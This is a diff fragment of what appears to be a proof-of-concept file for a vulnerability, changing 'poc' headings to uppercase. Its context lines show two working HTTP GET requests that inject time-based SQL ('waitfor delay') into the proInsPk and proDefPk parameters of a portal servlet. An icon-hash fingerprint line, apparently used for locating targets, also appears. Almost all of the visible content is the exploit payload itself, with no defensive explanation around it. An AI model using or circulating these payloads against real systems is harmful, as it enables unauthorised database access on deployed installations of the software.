@@ -7,7 +7,7 @@ icon_hash="1085941792"
 ```
 
 
-## poc
+## POC
 ```
 GET /portal/pt/servlet/runStateServlet/doPost?pageId=login&proInsPk=1'waitfor+delay+'0:0:6'-- HTTP/1.1
 Host: 192.168.63.129:8088
@@ -18,7 +18,7 @@ Content-Length: 19
 ```
 
 
-## poc2
+## POC2
 ```
 GET /portal/pt/servlet/runStateServlet/doPost?pageId=login&proDefPk=1'waitfor+delay+'0:0:6'-- HTTP/1.1
 Host: 192.168.63.129:8088
